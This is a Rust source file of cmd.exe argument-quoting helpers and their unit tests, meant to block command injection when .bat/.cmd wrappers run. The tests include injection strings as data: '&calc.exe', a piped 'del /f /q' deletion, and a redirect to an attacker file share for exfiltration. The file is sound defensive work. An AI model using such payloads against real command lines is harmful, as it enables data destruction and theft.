//! Pure cmd.exe argument-quoting helpers.
//!
//! These functions implement cmd.exe's quoting rules as pure string
//! manipulation — they touch no Windows API — so they are compiled and tested
//! on every platform. The Windows-only subprocess runtime calls them when
//! building a `cmd.exe /V:OFF /S /C "..."` command line for `.bat`/`.cmd`
//! wrappers; the cross-platform test suite exercises the injection defenses
//! on Linux CI runners, which would otherwise give zero coverage of the
//! quoting logic (#5012).

// On non-Windows targets these functions are only reached from tests (the
// production caller in `invocation.rs` is `#[cfg(windows)]`). Suppress the
// dead-code lint rather than gating compilation, so the test module can
// exercise the injection defenses on every platform.
#![cfg_attr(not(any(windows, test)), allow(dead_code))]

use std::path::Path;

/// Quote a single argument for use inside a `cmd.exe /V:OFF /S /C "..."` command line.
///
/// ## cmd.exe quoting rules inside double-quoted regions
///
/// Once cmd.exe sees an opening `"` it enters a quoted region. Inside that region:
///
/// - Characters like `&`, `|`, `<`, `>`, `(`, and `)` are literal; they do not
///   need `^` escaping.
/// - `^` is also literal in a quoted region, so doubling it would change the
///   argument seen by the child process.
/// - `%` is passed through verbatim. The `%%` → `%` collapse is a *batch-file*
///   rule and does not apply to the `/C` command line: a `%%` there arrives as
///   two literal percent signs and corrupts tool arguments such as perlcritic's
///   `--verbose=%f:%l:%c:%s:%p:%m\n` format strings. Residual caveat: a
///   `%NAME%` span whose `NAME` matches a defined environment variable IS
///   substituted by cmd.exe's command-line expansion pass (no escape for `%`
///   exists at the command line). [`windows_has_expandable_percent_ref`]
///   detects that case so callers can fail closed instead of silently spawning
///   a corrupted argument.
/// - `!` would be processed by the delayed-expansion pass when `/V:ON` is in
///   effect. We invoke cmd.exe with `/V:OFF` to suppress this entirely, so `!`
///   needs no escaping here.
/// - To embed a literal `"` inside a double-quoted cmd.exe token, use `""` (the
///   cmd.exe shell convention). The `\"` form is for `CommandLineToArgvW` (the
///   Win32 C-runtime argv parser), which is a different parser from the cmd.exe
///   shell command-line parser.
pub(crate) fn windows_quote_for_cmd(arg: &str) -> String {
    let mut escaped = String::with_capacity(arg.len() + 2);
    escaped.push('"');
    for ch in arg.chars() {
        match ch {
            '"' => escaped.push_str("\"\""),
            _ => escaped.push(ch),
        }
    }
    escaped.push('"');
    escaped
}

/// Whether `arg` contains a `%NAME%` span that cmd.exe's command-line
/// expansion pass would substitute with a defined environment variable.
///
/// cmd.exe expands `%NAME%` on the `/C` command line before the token reaches
/// the child, and no escape for `%` exists at the command line (the `%%`
/// doubling is batch-file syntax only). An argument such as
/// `--out=%TEMP%\x` would therefore reach the tool with `F:\…\Temp` already
/// substituted — silent data corruption. Callers route `.bat`/`.cmd`
/// invocations through cmd.exe, so they use this predicate to fail closed on
/// such arguments instead (#17371).
///
/// The scan mirrors cmd.exe's command-line pairing: from each `%` it looks for
/// the next `%`, treats the text between as the variable name (case handled by
/// the caller's lookup, which sees Windows' case-insensitive environment), and
/// resumes just after the opening `%` when the name is not defined: cmd.exe
/// restarts pairing at that closing `%`, so in `%undefined%TEMP%` the second
/// span is `TEMP` and does expand (verified against real cmd.exe). The `is_defined`
/// parameter is injected so the scan stays a pure, cross-platform-testable
/// function; production passes `|name| std::env::var_os(name).is_some()`.
/// cmd.exe dynamic variables expanded on the `/C` command line even when absent
/// from the parent environment (command extensions enabled by default; we never
/// pass `/E:OFF`). See #17437.
#[cfg(any(windows, test))]
pub(crate) const CMD_DYNAMIC_VARIABLES: &[&str] = &[
    "CD",
    "DATE",
    "TIME",
    "RANDOM",
    "ERRORLEVEL",
    "CMDEXTVERSION",
    "CMDCMDLINE",
    "HIGHESTNUMANODENUMBER",
];

/// Whether cmd.exe would treat `name` as defined for `%NAME%` command-line expansion.
///
/// `env_lookup` mirrors `std::env::var_os(name).is_some()` at the production call
/// site; dynamic cmd.exe variables are accepted in addition (#17437).
#[cfg(any(windows, test))]
pub(crate) fn is_cmd_defined(name: &str, env_lookup: impl Fn(&str) -> bool) -> bool {
    if env_lookup(name) {
        return true;
    }
    CMD_DYNAMIC_VARIABLES.iter().any(|dynamic| dynamic.eq_ignore_ascii_case(name))
}

pub(crate) fn windows_has_expandable_percent_ref(
    arg: &str,
    is_defined: impl Fn(&str) -> bool,
) -> bool {
    let mut i = 0usize;
    while let Some(start) = arg[i..].find('%') {
        let open = i + start;
        let Some(rel_close) = arg[open + 1..].find('%') else {
            // No closing `%`: not a `%NAME%` pair — cmd leaves it verbatim.
            return false;
        };
        let close = open + 1 + rel_close;
        let name = &arg[open + 1..close];
        // cmd.exe also expands `%NAME:~start,len%` (substring) and
        // `%NAME:old=new%` (replacement), so the defined-name lookup applies
        // to the base name before the first `:` as well as the full text.
        let base = name.split_once(':').map_or(name, |(base, _)| base);
        if !base.is_empty() && (is_defined(name) || is_defined(base)) {
            return true;
        }
        i = open + 1;
    }
    false
}

/// Whether `program` is a `.bat`/`.cmd` wrapper that must be run via `cmd.exe`.
///
/// Pure extension check — no filesystem access.
pub(crate) fn windows_requires_cmd_shell(program: &str) -> bool {
    Path::new(program)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.eq_ignore_ascii_case("bat") || ext.eq_ignore_ascii_case("cmd"))
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- windows_quote_for_cmd ----

    #[test]
    fn quote_wraps_in_double_quotes() {
        assert_eq!(windows_quote_for_cmd("hello"), "\"hello\"");
    }

    #[test]
    fn quote_empty_string() {
        assert_eq!(windows_quote_for_cmd(""), "\"\"");
    }

    #[test]
    fn quote_metacharacters_are_literal_inside_quotes() {
        // Inside a cmd.exe double-quoted region, shell metacharacters
        // (& | < > ( )) are literal — no ^ prefix is used.
        // ^ is literal — must NOT be doubled.
        // % passes through verbatim: the %% collapse is batch-file syntax and
        // does not apply on the /C command line.
        // " is doubled (cmd.exe "" convention), not backslash-escaped.
        let quoted = windows_quote_for_cmd(r#"profile&name|1>%TEMP%^"x""#);
        assert_eq!(quoted, r#""profile&name|1>%TEMP%^""x""""#);
    }

    #[test]
    fn quote_caret_not_doubled() {
        // A regression that erroneously doubled `^` inside quoted regions.
        // Inside a cmd.exe double-quoted region `^` is literal and must not be
        // escaped.
        let quoted = windows_quote_for_cmd(r"foo^bar");
        assert_eq!(quoted, r#""foo^bar""#);
    }

    #[test]
    fn quote_embedded_quote_uses_doubling() {
        // cmd.exe convention: "" represents a literal " inside a quoted token.
        // The `\"` form is the CommandLineToArgvW convention and is WRONG here.
        let quoted = windows_quote_for_cmd(r#"arg"with"quotes"#);
        assert_eq!(quoted, r#""arg""with""quotes""#);
    }

    #[test]
    fn quote_percent_signs_pass_through_verbatim() {
        // #17371 regression guard: the old code doubled `%` to `%%`. That
        // collapse is a *batch-file* rule; on the `/C` command line `%%`
        // arrives as two literal percent signs and corrupts real tool
        // arguments such as perlcritic's --verbose format strings.
        assert_eq!(
            windows_quote_for_cmd("--verbose=%f:%l:%c:%s:%p:%m\\n"),
            "\"--verbose=%f:%l:%c:%s:%p:%m\\n\""
        );
        assert_eq!(windows_quote_for_cmd("100%"), "\"100%\"");
        assert_eq!(windows_quote_for_cmd("%TEMP%"), "\"%TEMP%\"");
    }

    // ---- windows_has_expandable_percent_ref ----

    #[test]
    fn expandable_percent_ref_detects_defined_variable_names() {
        let env = ["TEMP", "lower_var"];
        let is_defined = |name: &str| env.iter().any(|e| e.eq_ignore_ascii_case(name));
        assert!(windows_has_expandable_percent_ref("--out=%TEMP%\\x", is_defined));
        assert!(windows_has_expandable_percent_ref("%temp% trailing", is_defined));
        assert!(windows_has_expandable_percent_ref("%LOWER_VAR%", is_defined));
        assert!(
            windows_has_expandable_percent_ref("a%TEMP%b%TEMP%c", is_defined),
            "multiple expandable spans must still be detected"
        );
    }

    #[test]
    fn is_cmd_defined_accepts_environment_via_lookup() {
        let env = ["MY_TOOL", "other"];
        let lookup = |name: &str| env.iter().any(|e| e.eq_ignore_ascii_case(name));
        assert!(is_cmd_defined("MY_TOOL", lookup));
        assert!(is_cmd_defined("my_tool", lookup));
        assert!(!is_cmd_defined("NOT_SET", lookup));
    }

    #[test]
    fn is_cmd_defined_accepts_cmd_dynamic_variables_without_env_entry() {
        let lookup = |_name: &str| false;
        for name in [
            "CD",
            "cd",
            "DATE",
            "TIME",
            "RANDOM",
            "ERRORLEVEL",
            "CMDEXTVERSION",
            "CMDCMDLINE",
            "HIGHESTNUMANODENUMBER",
        ] {
            assert!(
                is_cmd_defined(name, lookup),
                "{name} must be treated as cmd-defined even when absent from the environment"
            );
        }
        assert!(!is_cmd_defined("TEMP", lookup));
        assert!(!is_cmd_defined("f", lookup));
    }

    #[test]
    fn expandable_percent_ref_honors_cmd_dynamic_names_via_closure() {
        let lookup = |_name: &str| false;
        let is_defined = |name: &str| is_cmd_defined(name, lookup);
        assert!(windows_has_expandable_percent_ref("--label=%CD%", is_defined));
        assert!(windows_has_expandable_percent_ref("--seed=%RANDOM%", is_defined));
        assert!(!windows_has_expandable_percent_ref("--verbose=%f:%l:%c:%s:%p:%m\\n", is_defined));
    }

    #[test]
    fn expandable_percent_ref_ignores_undefined_and_unpaired() {
        // perlcritic-style format directives reference no defined variable and
        // must pass — this is the real --verbose argument the runtime sends.
        let is_defined = |name: &str| name.eq_ignore_ascii_case("TEMP");
        assert!(!windows_has_expandable_percent_ref("--verbose=%f:%l:%c:%s:%p:%m\\n", is_defined));
        assert!(!windows_has_expandable_percent_ref("%UNDEFINED_VAR%", is_defined));
        assert!(!windows_has_expandable_percent_ref("50% off", is_defined));
        assert!(!windows_has_expandable_percent_ref("no percent at all", is_defined));
        // Resume after each undefined pair so a later defined pair is still found.
        assert!(windows_has_expandable_percent_ref("%NOPE% then %TEMP%", is_defined));
        // cmd.exe restarts pairing at an undefined pair's closing `%`: the
        // closing `%` of `%undefined%` opens the `TEMP` span, which expands.
        assert!(windows_has_expandable_percent_ref("%undefined%TEMP%", is_defined));
        // Substring and replacement forms expand the base variable too.
        assert!(windows_has_expandable_percent_ref("%TEMP:~0,3%", is_defined));
        assert!(windows_has_expandable_percent_ref("%TEMP:x=y%", is_defined));
        assert!(!windows_has_expandable_percent_ref("%UNDEFINED_VAR:~0,3%", is_defined));
        // An empty %% pair has no name and is not expandable.
        assert!(!windows_has_expandable_percent_ref("100%%", is_defined));
    }

    #[test]
    fn quote_injection_attempt_is_inert() {
        // An attacker-controlled arg like `&calc.exe` must not break out of
        // the quoted token. After quoting, cmd.exe sees `&` as a literal
        // character inside the double-quoted region.
        let quoted = windows_quote_for_cmd("&calc.exe");
        assert_eq!(quoted, "\"&calc.exe\"");
    }

    #[test]
    fn quote_pipe_injection_is_inert() {
        let quoted = windows_quote_for_cmd("|del /f /q important.txt");
        assert_eq!(quoted, "\"|del /f /q important.txt\"");
    }

    #[test]
    fn quote_redirect_injection_is_inert() {
        let quoted = windows_quote_for_cmd(">\\\\attacker\\share\\exfil.txt");
        assert_eq!(quoted, "\">\\\\attacker\\share\\exfil.txt\"");
    }

    #[test]
    fn quote_exclamation_not_escaped() {
        // ! needs no escaping because cmd.exe is invoked with /V:OFF, which
        // disables delayed expansion entirely. Escaping it would change the
        // argument seen by the child process.
        let quoted = windows_quote_for_cmd("hello!world");
        assert_eq!(quoted, "\"hello!world\"");
    }

    #[test]
    fn quote_unicode_preserved() {
        // Non-ASCII characters are passed through unchanged.
        let quoted = windows_quote_for_cmd("héllo→世界");
        assert_eq!(quoted, "\"héllo→世界\"");
    }

    // ---- windows_requires_cmd_shell ----

    #[test]
    fn requires_cmd_shell_bat() {
        assert!(windows_requires_cmd_shell("perltidy.bat"));
        assert!(windows_requires_cmd_shell("C:\\tools\\perltidy.bat"));
        assert!(windows_requires_cmd_shell("perltidy.BAT")); // case-insensitive
    }

    #[test]
    fn requires_cmd_shell_cmd() {
        assert!(windows_requires_cmd_shell("wrapper.cmd"));
        assert!(windows_requires_cmd_shell("C:\\path\\wrapper.CMD"));
    }

    #[test]
    fn requires_cmd_shell_not_for_exe_or_bare() {
        assert!(!windows_requires_cmd_shell("perltidy.exe"));
        assert!(!windows_requires_cmd_shell("perltidy"));
        assert!(!windows_requires_cmd_shell("perltidy.pl"));
    }

    #[test]
    fn requires_cmd_shell_not_for_no_extension() {
        assert!(!windows_requires_cmd_shell("Makefile"));
        assert!(!windows_requires_cmd_shell("/usr/bin/perl"));
    }
}
